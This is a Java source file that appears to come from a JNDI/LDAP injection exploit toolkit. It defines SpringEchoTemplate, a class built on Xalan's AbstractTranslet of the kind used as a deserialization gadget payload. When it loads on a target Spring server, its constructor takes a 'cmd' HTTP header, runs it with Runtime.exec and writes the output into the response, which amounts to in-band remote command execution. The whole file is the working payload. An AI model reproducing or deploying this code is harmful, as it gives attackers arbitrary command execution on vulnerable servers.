package com.feihong.ldap.template;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.request.RequestAttributes;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class SpringEchoTemplate extends AbstractTranslet {

    public SpringEchoTemplate(){
        try{
            RequestAttributes requestAttributes = RequestContextHolder.getRequestAttributes();
            HttpServletRequest httprequest = ((ServletRequestAttributes) requestAttributes).getRequest();
            HttpServletResponse httpresponse = ((ServletRequestAttributes) requestAttributes).getResponse();

            String cmd = httprequest.getHeader("cmd");
            if(cmd != null && !cmd.isEmpty()){
                String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                httpresponse.getWriter().println(res);
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
